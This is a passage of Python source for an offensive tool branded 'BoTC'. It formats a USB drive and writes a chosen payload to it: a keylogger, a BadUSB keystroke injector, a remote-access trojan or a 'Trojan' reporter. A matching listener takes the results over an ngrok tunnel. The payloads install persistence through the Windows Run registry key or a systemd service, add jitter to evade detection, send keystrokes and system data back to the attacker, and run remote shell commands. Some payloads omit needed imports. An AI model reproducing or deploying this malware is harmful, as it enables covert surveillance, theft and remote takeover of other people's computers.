        print(f"{Fore.RED}Failed to detect ngrok tunnel. Ensure 'ngrok tcp {port}' is running.{Style.RESET_ALL}")
        input("Press Enter to retreat...")
        clear_screen()
        return
    host, ngrok_port = ngrok_url.split(':')
    print(f"{Fore.YELLOW}Listener Active: {host}:{ngrok_port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Awaiting {payload_type} reports... (Ctrl+C to exit){Style.RESET_ALL}")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    server.setblocking(False)
    
    while not stop_monitoring.is_set():
        readable, _, _ = select.select([server], [], [], 0.5)  # Faster polling
        if readable:
            conn, addr = server.accept()
            print(f"{Fore.RED}Connection from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
            data = conn.recv(1024).decode()
            if data.startswith(f"{payload_type}:"):
                session = data.split(":")[1]
                if session.startswith(session_id[:8]):
                    print(f"{Fore.RED}Session Verified: {session[:8]}...{Style.RESET_ALL}")
                    if payload_type == "Keylogger":
                        print(f"{Fore.GREEN}Keystrokes:{Style.RESET_ALL}")
                        while True:
                            try:
                                key_data = conn.recv(1024).decode()
                                if not key_data: break
                                print(f"{Fore.GREEN}{key_data}{Style.RESET_ALL}")
                            except:
                                break
                    elif payload_type == "BadUSB":
                        print(f"{Fore.GREEN}BadUSB Output: {conn.recv(1024).decode()}{Style.RESET_ALL}")
                    elif payload_type == "RAT":
                        print(f"{Fore.GREEN}System Info: {conn.recv(1024).decode()}{Style.RESET_ALL}")
                        conn.send(b"whoami")
                        print(f"{Fore.GREEN}Command Output: {conn.recv(1024).decode()}{Style.RESET_ALL}")
                    elif payload_type == "Trojan":
                        print(f"{Fore.GREEN}Trojan Reports:{Style.RESET_ALL}")
                        while True:
                            try:
                                trojan_data = conn.recv(1024).decode()
                                if not trojan_data: break
                                print(f"{Fore.GREEN}{trojan_data}{Style.RESET_ALL}")
                            except:
                                break
                    conn.close()
                    print(f"{Fore.RED}Connection Closed.{Style.RESET_ALL}")
    
    server.close()
    print(f"{Fore.RED}Listener Terminated.{Style.RESET_ALL}")

def usb_sacrifice():
    """Optimized injector with success messages."""
    global last_payload, session_id, listener_port
    clear_screen()
    print(f"{Fore.RED}=== BoTC USB Sacrifice Ritual ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}WARNING: Use responsibly in controlled environments only.{Style.RESET_ALL}")
    
    usb_drives = find_usb_drives()
    if not usb_drives:
        print(f"{Fore.RED}No USB vessels detected.{Style.RESET_ALL}")
        input("Press Enter to retreat...")
        return
    
    print(f"{Fore.RED}USB Vessels:{Style.RESET_ALL}")
    for i, drive in enumerate(usb_drives, 1):
        try:
            size = shutil.disk_usage(drive).total // (1024**3)
            print(f"{i}. {drive} ({size} GB)")
        except:
            print(f"{i}. {drive} (Size unavailable)")
    
    choice = input("Select vessel (number) or 'c' to cancel: ")
    if choice.lower() == 'c':
        return
    
    try:
        drive_idx = int(choice) - 1
        selected_drive = usb_drives[drive_idx] if 0 <= drive_idx < len(usb_drives) else None
        if not selected_drive:
            raise ValueError
    except ValueError:
        print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")
        input("Press Enter to retreat...")
        return
    
    print(f"{Fore.RED}Format Options:{Style.RESET_ALL}")
    fs_options = ["NTFS", "FAT32", "exFAT"]
    for i, fs in enumerate(fs_options, 1):
        print(f"{i}. {fs}")
    fs_choice = input("Select filesystem (1-3): ")
    filesystem = fs_options[int(fs_choice) - 1] if fs_choice in "123" else "FAT32"
    
    quick = input(f"{Fore.RED}Quick format? (y/n): {Style.RESET_ALL}").lower() == 'y'
    if input(f"{Fore.RED}Consecrate {selected_drive} with {filesystem}? (y/n): {Style.RESET_ALL}").lower() != 'y':
        print(f"{Fore.RED}Ritual aborted.{Style.RESET_ALL}")
        input("Press Enter to retreat...")
        return
    
    formatted_mount = format_usb(selected_drive, filesystem, quick)
    if not formatted_mount:
        input("Press Enter to retreat...")
        return
    selected_drive = formatted_mount
    
    print(f"{Fore.RED}Payload Options:{Style.RESET_ALL}")
    payload_options = ["Keylogger", "BadUSB", "RAT", "Trojan"]
    for i, payload in enumerate(payload_options, 1):
        print(f"{i}. {payload}")
    
    option = input("Choose payload (1-4) or 'c' to cancel: ")
    if option.lower() == 'c':
        return
    
    last_payload = payload_options[int(option) - 1] if option in "1234" else None
    if not last_payload:
        print(f"{Fore.RED}Invalid payload.{Style.RESET_ALL}")
        input("Press Enter to retreat...")
        return
    
    port = listener_port
    setup_code = f"""
import os, sys, subprocess, platform, time, socket, random
try:
    import keyboard
except:
    subprocess.run([sys.executable, "-m", "ensurepip", "--user"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run([sys.executable, "-m", "pip", "install", "--user", "keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        import keyboard
    except:
        pass

if platform.system() == 'Windows':
    script = os.path.abspath(__file__)
    subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BoTC_{last_payload} /t REG_SZ /d "\\"{sys.executable}\\" \\"{{script}}\\"" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen([sys.executable, script], creationflags=0x08000000)
    sys.exit(0)
elif platform.system() == 'Linux':
    service = f"/etc/systemd/system/botc_{last_payload.lower()}.service"
    with open(service, 'w') as f:
        f.write(f'[Unit]\\nDescription=BoTC {last_payload}\\nAfter=network.target\\n\\n[Service]\\nExecStart={{sys.executable}} {{os.path.abspath(__file__)}}\\nRestart=always\\nUser={{getpass.getuser()}}\\n\\n[Install]\\nWantedBy=multi-user.target')
    subprocess.run(['sudo', 'systemctl', 'enable', f"botc_{last_payload.lower()}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sudo', 'systemctl', 'start', f"botc_{last_payload.lower()}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if os.fork() > 0:
        sys.exit(0)

def jitter():
    time.sleep(random.uniform(1, 5))  # Random delay to avoid detection
"""

    payloads = {
        "Keylogger": f"""
{setup_code}
host = 'HOST'  # Replace with ngrok host
port = {port}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    jitter()
    try:
        s.connect((host, int(port)))
        s.send(b"Keylogger:{session_id}")
        break
    except:
        pass
while True:
    try:
        key = keyboard.read_key()
        s.send(f"{{time.ctime()}} {{base64.b64encode(key.encode()).decode()}}".encode())
        jitter()
    except:
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            jitter()
            try:
                s.connect((host, int(port)))
                s.send(b"Keylogger:{session_id}")
                break
            except:
                pass
""",
        "BadUSB": f"""
{setup_code}
host = 'HOST'
port = {port}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    jitter()
    try:
        s.connect((host, int(port)))
        s.send(b"BadUSB:{session_id}")
        break
    except:
        pass
if platform.system() == 'Windows':
    keyboard.write("cmd")
    keyboard.press_and_release("enter")
    time.sleep(0.5)
    keyboard.write("ECHO BoTC > control.txt")
    keyboard.press_and_release("enter")
    s.send(b"Executed: Windows")
else:
    keyboard.write("whoami > /tmp/user.txt")
    keyboard.press_and_release("enter")
    s.send(b"Executed: Linux")
""",
        "RAT": f"""
{setup_code}
host = 'HOST'
port = {port}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    jitter()
    try:
        s.connect((host, int(port)))
        s.send(b"RAT:{session_id}")
        break
    except:
        pass
info = f"{{platform.node()}} {{socket.gethostbyname(socket.gethostname())}} {{platform.system()}} {{platform.release()}}"
s.send(base64.b64encode(info.encode()))
while True:
    try:
        cmd = s.recv(1024).decode()
        if cmd.lower() == 'exit':
            break
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
        s.send(base64.b64encode(output.encode()))
        jitter()
    except:
        break
s.close()
""",
        "Trojan": f"""
{setup_code}
host = 'HOST'
port = {port}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    jitter()
    try:
        s.connect((host, int(port)))
        s.send(b"Trojan:{session_id}")
        break
    except:
        pass
log_file = os.path.join(os.path.expanduser('~'), 'sys_log.txt')
while True:
    try:
        with open(log_file, 'a') as f:
            f.write(f"{{time.ctime()}}\\n")
        usage = shutil.disk_usage('/')
        data = f"Disk: {{usage.total // (1024**3)}}/{{usage.used // (1024**3)}} GB"
        s.send(base64.b64encode(data.encode()))
        jitter()
    except:
        break
"""
    }
    
    if write_code_to_usb(selected_drive, f"{last_payload.lower()}.py", payloads[last_payload]):
        print(f"{Fore.GREEN}Success: Payload inscribed.{Style.RESET_ALL}")
        if eject_usb(selected_drive):
            print(f"{Fore.GREEN}Success: USB ejected.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Port: {port}. Use option 9 to listen.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Ejection failed, payload inscribed.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Failed to inscribe payload.{Style.RESET_ALL}")
    
    input("Press Enter to retreat...")
    clear_screen()


login()
